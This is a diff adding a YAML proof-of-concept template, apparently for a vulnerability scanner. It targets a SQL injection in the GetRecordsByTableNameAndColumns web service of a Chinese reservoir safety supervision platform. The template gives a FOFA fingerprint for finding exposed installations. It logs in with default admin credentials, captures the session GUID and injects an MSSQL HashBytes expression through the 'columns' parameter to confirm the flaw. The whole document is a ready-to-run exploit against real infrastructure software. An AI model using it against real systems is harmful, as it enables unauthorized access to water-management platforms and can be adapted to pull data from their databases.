@@ -1,0 +1,28 @@
+id: poc-yaml-data86-getrecordsbytablenameandcolumns-sqli
+info:
+  name: 平升电子水库安全监管平台 GetRecordsByTableNameAndColumns SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 水库监管平台
+  fofa: js/PSExtend.js
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /WebServices/UserAdminService.asmx/LoginEx3
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: LoginName=admin&LoginPwd=123&isRemember=false
+  expression: status_code == 200 && contains(body,"\"Result\":true")
+  output:
+  - regex_match(body,"\"Guid\":\"(?P<uid>[0-9a-z-]+)\"")
+- method: POST
+  path: /WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: loginIdentifer={{.uid}}&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{.t1}}')),3,32)
+  expression: status_code == 200 && contains(body,"\"Column1\":") && contains(body,t2)
+    && contains(content_type,"text/xml")
+transport: http
